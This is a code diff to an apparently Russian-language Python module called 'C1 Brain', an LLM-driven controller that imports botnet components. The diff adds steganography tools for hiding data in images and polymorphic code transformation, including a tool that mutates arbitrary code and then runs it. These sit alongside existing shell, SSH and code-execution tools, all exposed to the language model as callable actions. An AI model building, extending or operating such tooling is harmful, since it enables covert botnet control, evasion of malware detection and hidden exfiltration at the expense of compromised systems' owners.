@@ -26,27 +26,35 @@ import shutil # Для файловых операций
 import tempfile
 import asyncssh  # Добавлено для поддержки SSH-сессий
 import io  # Для обработки байтов изображений
-import pytesseract  # Для OCR текстов из изображений
 from PIL import Image  # Для работы с изображениями
 from transformers import BlipProcessor, BlipForConditionalGeneration  # Модель подписи изображений
+
+# Настройка логирования
+logger = logging.getLogger('c1_brain') 
+logger.setLevel(logging.DEBUG)
+
+# Импортируем модуль стеганографии
+sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))
+try:
+    from steganography import Steganography
+    logger.info("Модуль стеганографии успешно импортирован")
+except ImportError as e:
+    logger.error(f"Ошибка импорта модуля стеганографии: {e}")
+    Steganography = None
+
+# Импортируем модуль полиморфизма
+try:
+    from polymorpher import PolyMorpher
+    logger.info("Модуль полиморфизма успешно импортирован")
+except ImportError as e:
+    logger.error(f"Ошибка импорта модуля полиморфизма: {e}")
+    PolyMorpher = None
 
 # Импортируем компоненты ботнета
 from core.botnet_controller import BotnetController, ZondInfo, ZondConnectionStatus
 from core.zond_protocol import TaskPriority, TaskStatus
 # Импортируем класс для вызова Gemini API
 from api_integration import GoogleAIIntegration
-
-# Настройка логирования
-# logging.basicConfig(
-#     level=logging.INFO,
-#     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-#     handlers=[
-#         logging.StreamHandler(),
-#         logging.FileHandler('c1_brain.log')
-#     ]
-# )
-logger = logging.getLogger('c1_brain') # Оставляем получение логгера
-logger.setLevel(logging.DEBUG) # ЯВНО УСТАНАВЛИВАЕМ УРОВЕНЬ DEBUG
 
 class ThinkingMode(Enum):
     """Режимы мышления для C1 Brain"""
@@ -1598,46 +1606,77 @@ class C1Brain:
             return f"Ошибка в C1Brain при обработке многошагового чата: {e}"
 
     async def _execute_tool(self, tool_name: str, args_str: str) -> Dict[str, Any]:
-        """Выполняет указанный инструмент с аргументами."""
+        """Выполняет инструмент по имени с заданными аргументами"""
+        logger.debug(f"Выполнение инструмента: {tool_name}, аргументы: {args_str}")
+        
+        # Парсим аргументы
         try:
-            # Безопасный парсинг аргументов
-            kwargs = self._parse_tool_args(args_str)
-            
-            # Сопоставление имени инструмента с методом
-            if tool_name == "execute_local_command" and hasattr(self, 'execute_local_command'):
-                return await self.execute_local_command(**kwargs)
-            elif tool_name == "list_directory" and hasattr(self, 'list_directory'):
-                return self.list_directory(**kwargs) # Синхронный вызов
-            elif tool_name == "read_file_content" and hasattr(self, 'read_file_content'):
-                return self.read_file_content(**kwargs) # Синхронный вызов
-            elif tool_name == "write_file_content" and hasattr(self, 'write_file_content'):
-                return self.write_file_content(**kwargs) # Синхронный вызов
-            elif tool_name == "get_current_directory" and hasattr(self, 'get_current_directory'):
-                return self.get_current_directory(**kwargs) # Синхронный вызов
-            # ВЫЗОВЫ НОВЫХ ИНСТРУМЕНТОВ
-            elif tool_name == "generate_file" and hasattr(self, 'generate_file'):
-                 return await self.generate_file(**kwargs) # Асинхронный
-            elif tool_name == "edit_file" and hasattr(self, 'edit_file'):
-                 return await self.edit_file(**kwargs) # Асинхронный
-            elif tool_name == "execute_code" and hasattr(self, 'execute_code'):
-                 return await self.execute_code(**kwargs) # Асинхронный
-            # Поддержка SSH-сессий
-            elif tool_name == "open_ssh_session" and hasattr(self, 'open_ssh_session'):
-                return await self.open_ssh_session(**kwargs)
-            elif tool_name == "execute_ssh_command" and hasattr(self, 'execute_ssh_command'):
-                return await self.execute_ssh_command(**kwargs)
-            elif tool_name == "close_ssh_session" and hasattr(self, 'close_ssh_session'):
-                return await self.close_ssh_session(**kwargs)
-            elif tool_name == "caption_image" and hasattr(self, 'caption_image'):
-                return await self.caption_image(**kwargs)
-            elif tool_name == "ocr_image" and hasattr(self, 'ocr_image'):
-                return await self.ocr_image(**kwargs)
-            else:
-                logger.warning(f"Unknown or unimplemented tool requested: {tool_name}")
-                return {"output": "", "error": f"Unknown tool: {tool_name}"}
+            args = self._parse_tool_args(args_str)
         except Exception as e:
-            logger.error(f"Error executing tool '{tool_name}': {e}", exc_info=True)
-            return {"output": "", "error": f"Error executing tool '{tool_name}': {str(e)}"}
+            return {"error": f"Ошибка парсинга аргументов: {e}"}
+        
+        # Выполняем инструмент
+        try:
+            if tool_name == "execute_local_command":
+                return await self.execute_local_command(args.get("command"), args.get("timeout"))
+            elif tool_name == "list_directory":
+                return self.list_directory(args.get("path", "."))
+            elif tool_name == "read_file_content":
+                return self.read_file_content(args.get("path"))
+            elif tool_name == "write_file_content":
+                return self.write_file_content(args.get("path"), args.get("content", ""))
+            elif tool_name == "get_current_directory":
+                return self.get_current_directory()
+            elif tool_name == "generate_file":
+                return await self.generate_file(args.get("path"), args.get("prompt", ""))
+            elif tool_name == "edit_file":
+                return await self.edit_file(args.get("path"), args.get("prompt", ""))
+            elif tool_name == "execute_code":
+                return await self.execute_code(args.get("language", "python"), args.get("code", ""))
+            elif tool_name == "open_ssh_session":
+                return await self.open_ssh_session(
+                    args.get("host"), 
+                    args.get("port", 22), 
+                    args.get("username"), 
+                    args.get("password"), 
+                    args.get("key_file")
+                )
+            elif tool_name == "execute_ssh_command":
+                return await self.execute_ssh_command(args.get("session_id"), args.get("command"))
+            elif tool_name == "close_ssh_session":
+                return await self.close_ssh_session(args.get("session_id"))
+            elif tool_name == "caption_image":
+                # Этот метод принимает байты, поэтому нельзя вызвать как обычный инструмент
+                return {"error": "Инструмент caption_image должен вызываться через API напрямую"}
+            elif tool_name == "hide_data_in_image":
+                return await self.hide_data_in_image(
+                    args.get("image_path"), 
+                    args.get("data"), 
+                    args.get("output_path"),
+                    args.get("encryption_key"),
+                    args.get("method", "lsb")
+                )
+            elif tool_name == "extract_data_from_image":
+                return await self.extract_data_from_image(
+                    args.get("stego_image_path"),
+                    args.get("encryption_key"),
+                    args.get("method", "lsb")
+                )
+            elif tool_name == "transform_code":
+                return await self.transform_code(
+                    args.get("code"),
+                    args.get("randomization_level", 3)
+                )
+            elif tool_name == "execute_transformed_code":
+                return await self.execute_transformed_code(
+                    args.get("code"),
+                    args.get("randomization_level", 3)
+                )
+            else:
+                return {"error": f"Неизвестный инструмент: {tool_name}"}
+        except Exception as e:
+            logger.error(f"Ошибка выполнения инструмента {tool_name}: {e}", exc_info=True)
+            return {"error": f"Ошибка выполнения инструмента {tool_name}: {str(e)}"}
 
     def _parse_tool_args(self, args_str: str) -> Dict[str, Any]:
         """Безопасно парсит строку аргументов инструмента."""
@@ -1936,30 +1975,263 @@ class C1Brain:
             return {"error": f"Error closing SSH session: {e}"}
 
     async def caption_image(self, image_bytes: bytes) -> Dict[str, str]:
-        """Генерирует подпись (caption) для переданных байтов изображения"""
+        """
+        Генерирует подпись к изображению с помощью BLIP.
+        
+        Args:
+            image_bytes: Байты изображения
+            
+        Returns:
+            Словарь с подписью к изображению
+        """
         try:
-            # Читаем изображение из байтов
-            image = Image.open(io.BytesIO(image_bytes)).convert("RGB")
-            # Подготавливаем вход для модели
-            inputs = self.image_processor(images=image, return_tensors="pt")
-            # Генерируем подпись
-            output_ids = self.image_model.generate(**inputs)
-            caption = self.image_processor.decode(output_ids[0], skip_special_tokens=True)
+            # Загружаем изображение из байтов
+            image = Image.open(io.BytesIO(image_bytes))
+            
+            # Получаем подпись
+            inputs = self.image_processor(image, return_tensors="pt")
+            out = self.image_model.generate(**inputs, max_length=80)
+            caption = self.image_processor.decode(out[0], skip_special_tokens=True)
+            
+            logger.info(f"Сгенерирована подпись к изображению: {caption}")
             return {"caption": caption}
         except Exception as e:
-            logger.error(f"Error in caption_image: {e}")
-            return {"caption": "", "error": str(e)}
-
-    async def ocr_image(self, image_bytes: bytes) -> Dict[str, str]:
-        """Извлекает текст из изображения с помощью pytesseract"""
+            logger.error(f"Ошибка при генерации подписи к изображению: {e}")
+            return {"error": str(e)}
+            
+    async def hide_data_in_image(self, image_path: str, data: str, output_path: str = None, 
+                                encryption_key: str = None, method: str = 'lsb') -> Dict[str, str]:
+        """
+        Скрывает данные в изображении используя стеганографию.
+        
+        Args:
+            image_path: Путь к исходному изображению
+            data: Данные для скрытия в изображении
+            output_path: Путь к выходному изображению (опционально)
+            encryption_key: Ключ шифрования (опционально)
+            method: Метод стеганографии ('lsb' или 'metadata')
+            
+        Returns:
+            Словарь с результатом операции
+        """
         try:
-            image = Image.open(io.BytesIO(image_bytes)).convert('RGB')
-            # Обрезка и предобработка можно добавить здесь
-            text = pytesseract.image_to_string(image)
-            return {"text": text.strip()} if text else {"text": "", "error": "No text detected"}
+            if not Steganography:
+                return {"error": "Модуль стеганографии не доступен"}
+                
+            # Проверяем существование исходного изображения
+            if not os.path.exists(image_path):
+                return {"error": f"Исходное изображение не найдено: {image_path}"}
+                
+            # Создаем экземпляр стеганографии
+            steg = Steganography(encryption_key=encryption_key, compression=True)
+            
+            # Скрываем данные
+            result_path = steg.hide_data(
+                image_path=image_path,
+                data=data,
+                output_path=output_path,
+                method=method
+            )
+            
+            # Вычисляем размер данных и изображения
+            data_size = len(data.encode('utf-8'))
+            image_size = os.path.getsize(result_path)
+            
+            logger.info(f"Данные успешно скрыты в изображении: {result_path}")
+            return {
+                "success": True,
+                "output_path": result_path,
+                "original_image": image_path,
+                "data_size": data_size,
+                "image_size": image_size,
+                "method": method,
+                "encrypted": encryption_key is not None
+            }
         except Exception as e:
-            logger.error(f"Error in ocr_image: {e}")
-            return {"text": "", "error": str(e)}
+            logger.error(f"Ошибка при скрытии данных в изображении: {e}")
+            return {"error": str(e)}
+    
+    async def extract_data_from_image(self, stego_image_path: str, 
+                                     encryption_key: str = None, method: str = 'lsb') -> Dict[str, str]:
+        """
+        Извлекает скрытые данные из изображения.
+        
+        Args:
+            stego_image_path: Путь к изображению со скрытыми данными
+            encryption_key: Ключ шифрования (опционально)
+            method: Метод стеганографии ('lsb' или 'metadata')
+            
+        Returns:
+            Словарь с извлеченными данными
+        """
+        try:
+            if not Steganography:
+                return {"error": "Модуль стеганографии не доступен"}
+                
+            # Проверяем существование изображения
+            if not os.path.exists(stego_image_path):
+                return {"error": f"Изображение не найдено: {stego_image_path}"}
+                
+            # Создаем экземпляр стеганографии
+            steg = Steganography(encryption_key=encryption_key, compression=True)
+            
+            # Извлекаем данные
+            extracted_bytes = steg.extract_data(
+                stego_image_path=stego_image_path,
+                method=method
+            )
+            
+            # Преобразуем в строку
+            extracted_data = extracted_bytes.decode('utf-8')
+            
+            logger.info(f"Данные успешно извлечены из изображения: {stego_image_path}")
+            return {
+                "success": True,
+                "data": extracted_data,
+                "image_path": stego_image_path,
+                "data_size": len(extracted_bytes),
+                "method": method
+            }
+        except Exception as e:
+            logger.error(f"Ошибка при извлечении данных из изображения: {e}")
+            return {"error": str(e)}
+    
+    async def transform_code(self, code: str, randomization_level: int = 3) -> Dict[str, Any]:
+        """
+        Применяет полиморфную трансформацию к коду.
+        
+        Args:
+            code: Исходный код для трансформации
+            randomization_level: Уровень рандомизации от 1 до 5
+            
+        Returns:
+            Словарь с результатом трансформации
+        """
+        try:
+            if not PolyMorpher:
+                return {"error": "Модуль полиморфизма не доступен"}
+            
+            # Создаем экземпляр полиморфизма
+            poly = PolyMorpher(randomization_level=randomization_level)
+            
+            # Применяем трансформацию
+            transformed_code = poly.transform_code(code)
+            
+            # Проверяем эквивалентность выполнения (если возможно)
+            equivalent = False
+            try:
+                equivalent = poly.compare_execution(code, transformed_code)
+            except Exception as e:
+                logger.warning(f"Не удалось проверить эквивалентность исполнения: {e}")
+            
+            logger.info(f"Код успешно трансформирован, эквивалентность: {equivalent}")
+            return {
+                "success": True,
+                "original_code": code,
+                "transformed_code": transformed_code,
+                "randomization_level": randomization_level,
+                "equivalent_execution": equivalent
+            }
+        except Exception as e:
+            logger.error(f"Ошибка при трансформации кода: {e}")
+            return {"error": str(e)}
+    
+    async def execute_transformed_code(self, code: str, randomization_level: int = 3) -> Dict[str, Any]:
+        """
+        Трансформирует код и выполняет его.
+        
+        Args:
+            code: Исходный код для трансформации и выполнения
+            randomization_level: Уровень рандомизации от 1 до 5
+            
+        Returns:
+            Словарь с результатом выполнения
+        """
+        try:
+            if not PolyMorpher:
+                return {"error": "Модуль полиморфизма не доступен"}
+            
+            # Создаем экземпляр полиморфизма
+            poly = PolyMorpher(randomization_level=randomization_level)
+            
+            # Применяем трансформацию
+            transformed_code = poly.transform_code(code)
+            
+            # Выполняем трансформированный код
+            exit_code, stdout, stderr = poly.execute_code(transformed_code)
+            
+            logger.info(f"Трансформированный код выполнен, exit_code: {exit_code}")
+            return {
+                "success": exit_code == 0,
+                "original_code": code,
+                "transformed_code": transformed_code,
+                "exit_code": exit_code,
+                "stdout": stdout,
+                "stderr": stderr,
+                "randomization_level": randomization_level
+            }
+        except Exception as e:
+            logger.error(f"Ошибка при выполнении трансформированного кода: {e}")
+            return {"error": str(e)}
+
+    def _get_tools_description(self) -> str:
+        """Возвращает описание доступных инструментов для LLM"""
+        tools = """
+        Доступны следующие инструменты (используйте их в формате [TOOL_CALL: название_инструмента(аргументы)]):
+        
+        1. execute_local_command(command: str, timeout: float = None) - Выполняет команду в локальной оболочке.
+           - command: строка с командой для выполнения
+           - timeout: опциональный таймаут в секундах
+           
+        2. list_directory(path: str = ".") - Получает список файлов и директорий.
+           - path: путь к директории
+           
+        3. read_file_content(path: str) - Считывает содержимое файла.
+           - path: путь к файлу
+           
+        4. write_file_content(path: str, content: str) - Записывает текст в файл.
+           - path: путь к файлу
+           - content: содержимое для записи
+           
+        5. get_current_directory() - Получает текущую рабочую директорию.
+           
+        6. generate_file(path: str, prompt: str) - Генерирует файл с помощью LLM.
+           - path: путь к файлу
+           - prompt: описание файла для генерации
+           
+        7. edit_file(path: str, prompt: str) - Редактирует файл с помощью LLM.
+           - path: путь к файлу
+           - prompt: инструкции по редактированию
+           
+        8. execute_code(language: str, code: str) - Выполняет код на указанном языке.
+           - language: язык программирования (python, shell, js)
+           - code: код для выполнения
+           
+        9. hide_data_in_image(image_path: str, data: str, output_path: str = None, 
+                            encryption_key: str = None, method: str = 'lsb') - Скрывает данные в изображении.
+           - image_path: путь к исходному изображению
+           - data: данные для скрытия в изображении
+           - output_path: путь для сохранения результата (опционально)
+           - encryption_key: ключ шифрования (опционально)
+           - method: метод стеганографии ('lsb' или 'metadata')
+           
+        10. extract_data_from_image(stego_image_path: str, encryption_key: str = None, 
+                                 method: str = 'lsb') - Извлекает данные из изображения.
+           - stego_image_path: путь к изображению со скрытыми данными
+           - encryption_key: ключ шифрования (опционально)
+           - method: метод стеганографии ('lsb' или 'metadata')
+            
+        11. transform_code(code: str, randomization_level: int = 3) - Применяет полиморфную трансформацию к коду.
+            - code: исходный код для трансформации
+            - randomization_level: уровень рандомизации от 1 до 5
+            
+        12. execute_transformed_code(code: str, randomization_level: int = 3) - Трансформирует и выполняет код.
+            - code: исходный код для трансформации и выполнения
+            - randomization_level: уровень рандомизации от 1 до 5
+        
+        Используйте эти инструменты для выполнения задач. После каждого вызова инструмента я верну результат.
+        """
+        return tools
 
 # Пример использования
 if __name__ == "__main__":
